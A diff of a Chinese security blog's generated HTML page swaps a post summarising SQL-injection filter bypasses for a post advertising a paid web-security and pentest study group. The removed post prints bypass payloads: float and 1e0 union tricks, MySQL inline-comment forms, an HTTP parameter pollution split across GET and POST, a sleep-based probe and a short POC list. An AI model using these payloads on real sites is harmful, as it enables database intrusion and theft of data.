@@ -5,16 +5,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL注入绕过总结[持续更新], keywords">
-    <meta name="description" content="MSSQL数据库特性
-注释绕过：
-MSSQL也可以使用/**/注释
-
-
-浮点数：
-select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from user
-
-">
+    <meta name="keywords" content="我的小密圈, keywords">
+    <meta name="description" content="小密圈介绍小密圈主要的是分享Web安全（漏洞挖掘，代码审计），渗透测试（getshell分析，新爆漏洞分析等），还有一些其他有趣的东西，价格暂时为111（其实价格不算贵，毕竟知识是无价的，而且我在拿这些入圈费进行一些秘密活动~~ 总之收益大">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +14,7 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>SQL注入绕过总结[持续更新] | only_free blog</title>
+    <title>我的小密圈 | only_free blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -244,13 +236,13 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        SQL注入绕过总结[持续更新]
+                        我的小密圈
                     </div>
                 </div>
             </div>
@@ -362,93 +354,32 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
             <div class="article-tag">
             <span class="chip bg-color"><span id="busuanzi_value_page_pv"></span> ℃</span>
                 
-                <a href="/tags/SQL注入/" target="_blank">
-                    <span class="chip bg-color">SQL注入</span>
+                <a href="/tags/小密圈/" target="_blank">
+                    <span class="chip bg-color">小密圈</span>
                 </a>
                 
             </div>
             
             <div class="post-info">
                 
-                <span class="post-cate">
-                    <i class="fa fa-bookmark fa-fw icon-category"></i>
-                    
-                    <a href="/categories/Web安全/" class="post-category" target="_blank">
-                        Web安全
-                    </a>
-                    
-                </span>
-                
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2019-01-16
+                    <i class="fa fa-clock-o fa-fw"></i>2019-01-18
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="MSSQL数据库特性"><a href="#MSSQL数据库特性" class="headerlink" title="MSSQL数据库特性"></a>MSSQL数据库特性</h2><ul>
-<li>注释绕过：<ul>
-<li><code>MSSQL</code>也可以使用<code>/**/</code>注释</li>
-</ul>
-</li>
-<li>浮点数：<ul>
-<li><code>select * from user where id=1.1union select 1,&#39;2&#39;,db_name() from user</code></li>
-</ul>
-</li>
-<li><code>1EO</code>形式<ul>
-<li><code>select * from user where id=1e0union select 1,&#39;2&#39;,db_name() from user</code></li>
-</ul>
-</li>
-</ul>
-<p>如执行</p>
-<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>eunion <span class="token keyword">select</span> xxxxxxx
-</code></pre>
-<p>等同于</p>
-<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> xxxxxxx
-</code></pre>
-<p>但是这样可以绕过对<code>union select</code>的防御</p>
-<h3 id="HPP特性"><a href="#HPP特性" class="headerlink" title="HPP特性"></a><code>HPP</code>特性</h3><p><code>ASPX+IIS</code>搭配的时候同时提交参数<code>id</code>，会接收所有的参数，通过逗号分割，比如在<code>cookie、post、get</code>里都传入<code>id=1</code>，那么最终的结果会是<code>1,1,1</code></p>
-<p>再比如这个<code>url:http://www.a.com/index.php?id=1</code>存在<code>sql</code>注入，那么可与这样子</p>
-<p><strong><code>get</code>请求中传入如下参数</strong></p>
-<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//www.a.com/index.php?id=1.eunion/**/select null,null,name/*</span>
-</code></pre>
-<p><strong>然后在<code>post</code>请求中传入如下参数</strong></p>
-<pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">*</span><span class="token operator">/</span><span class="token keyword">from</span> xxxxxxx
-</code></pre>
-<p>最终的输出结果就会变成这个样子</p>
-<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token number">1</span><span class="token punctuation">.</span>eunion<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>name<span class="token comment" spellcheck="true">/*,*/</span><span class="token keyword">from</span> xxxxxxx
-</code></pre>
-<h2 id="MYSQL特性"><a href="#MYSQL特性" class="headerlink" title="MYSQL特性"></a>MYSQL特性</h2><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><pre class=" language-sql"><code class="language-sql">内联注释：<span class="token comment" spellcheck="true">/*!12345union*/</span><span class="token keyword">select</span>
-</code></pre>
-<p><img src="http://static.zybuluo.com/1kbfree/693xs0jeiif90en5l30jnzm6/1.png" alt="1.png-8kB"></p>
-<p>如下方法可以快速的检测某处是否存在<code>sql</code>注入漏洞</p>
-<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//www.xxx.com/index.php?id=1/*!12345union*/select/*!union12345sleep(5)*/;</span>
-</code></pre>
-<h3 id="x-xxxx"><a href="#x-xxxx" class="headerlink" title="{x xxxx}"></a><code>{x xxxx}</code></h3><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> {x <span class="token keyword">user</span>}
-</code></pre>
-<p>结果和这样一样</p>
-<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span>
-</code></pre>
-<p><img src="http://static.zybuluo.com/1kbfree/nuoptfjsz071utup5dp5nhfe/1.png" alt="1.png-8.9kB"></p>
-<h3 id="E0"><a href="#E0" class="headerlink" title="E0"></a><code>E0</code></h3><pre><code>E0在mysql里是效果等于空格
-</code></pre><p><img src="http://static.zybuluo.com/1kbfree/tnz7xiw06zro2d1vm34m66pt/1.png" alt="1.png-18.6kB"></p>
-<h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p><img src="http://static.zybuluo.com/1kbfree/oxyz6iqpo51n1bmvxf6pwfpv/1.png" alt="1.png-16kB"></p>
-<pre class=" language-sql"><code class="language-sql"><span class="token punctuation">.</span>1union <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxxx
-</code></pre>
-<p>然后就会变成</p>
-<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxx <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>1union <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxxxx
-</code></pre>
-<p>这样子的话<code>id</code>就是不存在然后就会执行后面的<code>SQL</code>语句</p>
-<h3 id="一些POC"><a href="#一些POC" class="headerlink" title="一些POC"></a>一些<code>POC</code></h3><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>、<span class="token comment" spellcheck="true">/*!12345select*/</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span>
-<span class="token number">2</span>、<span class="token comment" spellcheck="true">/*!50001select*/</span><span class="token keyword">from</span>
-<span class="token number">3</span>、<span class="token keyword">Select</span><span class="token comment" spellcheck="true">/**/</span>column_name<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span>
-<span class="token number">4</span>、<span class="token comment" spellcheck="true">/*!/*!select*/</span>column_name<span class="token comment" spellcheck="true">/*!/*!from*/</span>
-<span class="token number">5</span>、空格用<span class="token comment" spellcheck="true">/*!*/</span>代替
-<span class="token number">6</span>、<span class="token operator">%</span>53elect<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>schema_name<span class="token operator">%</span>0aFROM
-<span class="token number">7</span>、Get<span class="token operator">+</span>Post，编码，超长内容等等。
-</code></pre>
+                <h2 id="小密圈介绍"><a href="#小密圈介绍" class="headerlink" title="小密圈介绍"></a>小密圈介绍</h2><p>小密圈主要的是分享<code>Web</code>安全（漏洞挖掘，代码审计），渗透测试（<code>getshell</code>分析，新爆漏洞分析等），还有一些其他有趣的东西，价格暂时为<code>111</code>（其实价格不算贵，毕竟知识是无价的，而且我在拿这些入圈费进行一些秘密活动~~ 总之收益大家的）</p>
+<p><img src="http://static.zybuluo.com/1kbfree/yl7zhfxyuwytt2gmlqu4paec/1.png" alt="1.png-39.5kB"></p>
+<p>如果觉得贵的话我觉得没必要来的~ 毕竟不愿意为自己投资 毫无办法~</p>
+<p>小密圈价格会越来越高，支持我的表哥们早点来呀~</p>
+<p><img src="http://static.zybuluo.com/1kbfree/0csop73ilzhup0sc7sp11vlc/image_1d1ek93iuappavn1g3jtff10ghl.png" alt="image_1d1ek93iuappavn1g3jtff10ghl.png-110.2kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/d4qcz2bzvke9en674fjtl2gw/image_1d1ek9flb4ou1ngg5kgjno1h6412.png" alt="image_1d1ek9flb4ou1ngg5kgjno1h6412.png-155.8kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/hni03rrfsyw5rxg3pp3ucka2/image_1d1eka002lhf2mfll8bp814bk1f.png" alt="image_1d1eka002lhf2mfll8bp814bk1f.png-136.9kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/qdvci0iybhkqleqkqzh0eejx/image_1d1ekagg7119jk0d61r18av17f91s.png" alt="image_1d1ekagg7119jk0d61r18av17f91s.png-147.2kB"></p>
+<p>还有很多~~ 总之干活多多呢！！！！</p>
 
             </div>
             <hr>
@@ -470,7 +401,7 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
                     <span class="reprint-tip">Reprint please specify: </span>
                     <a href="https://only-free.github.into" class="b-link-green">only_free blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/01/16/sql-zhu-ru-rao-guo-zong-jie-chi-xu-geng-xin/" class="b-link-green">SQL注入绕过总结[持续更新]</a>
+                    <a href="/2019/01/18/wo-de-xiao-mi-quan/" class="b-link-green">我的小密圈</a>
                 </p>
             </div>
         </div>
@@ -492,7 +423,7 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
         repo: 'only-free.github.io',
         owner: 'only-free',
         admin: "only-free",
-        id: '2019-01-16T23-21-31',
+        id: '2019-01-18T03-25-01',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -514,7 +445,7 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
     <div class="row article-row">
         
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">Previous</div>
+            <div class="article-badge left-badge text-color">Current</div>
             <div class="card">
                 <a href="/2019/01/18/wo-de-xiao-mi-quan/">
                     <div class="card-image">
@@ -528,9 +459,9 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
                 <div class="card-content article-content">
                     <div class="summary">小密圈介绍小密圈主要的是分享Web安全（漏洞挖掘，代码审计），渗透测试（getshell分析，新爆漏洞分析等），还有一些其他有趣的东西，价格暂时为111（其实价格不算贵，毕竟知识是无价的，而且我在拿这些入圈费进行一些秘密活动~~ 总之收益大</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-01-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-01-18
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -539,6 +470,7 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -555,27 +487,35 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">Next</div>
             <div class="card">
-                <a href="/2019/01/14/duan-kou-xin-xi-zong-jie/">
+                <a href="/2019/01/16/sql-zhu-ru-rao-guo-zong-jie-chi-xu-geng-xin/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="端口信息总结">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="SQL注入绕过总结[持续更新]">
                         
-                        <span class="card-title">端口信息总结</span>
+                        <span class="card-title">SQL注入绕过总结[持续更新]</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">端口：0服务：Reserved说明：通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。 </div>
+                    <div class="summary">MSSQL数据库特性
+注释绕过：
+MSSQL也可以使用/**/注释
+
+
+浮点数：
+select * from user where id=1.1union select 1,&#39;2&#39;,db_name() from user
+
+</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-01-14
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-01-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/转载/" class="post-category" target="_blank">
-                                    转载
+                            <a href="/categories/Web安全/" class="post-category" target="_blank">
+                                    Web安全
                                 </a>
                             
                             
@@ -585,8 +525,8 @@ select * from user where id=1.1union select 1,&amp;#39;2&amp;#39;,db_name() from
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/端口/" target="_blank">
-                        <span class="chip bg-color">端口</span>
+                    <a href="/tags/SQL注入/" target="_blank">
+                        <span class="chip bg-color">SQL注入</span>
                     </a>
                     
                 </div>
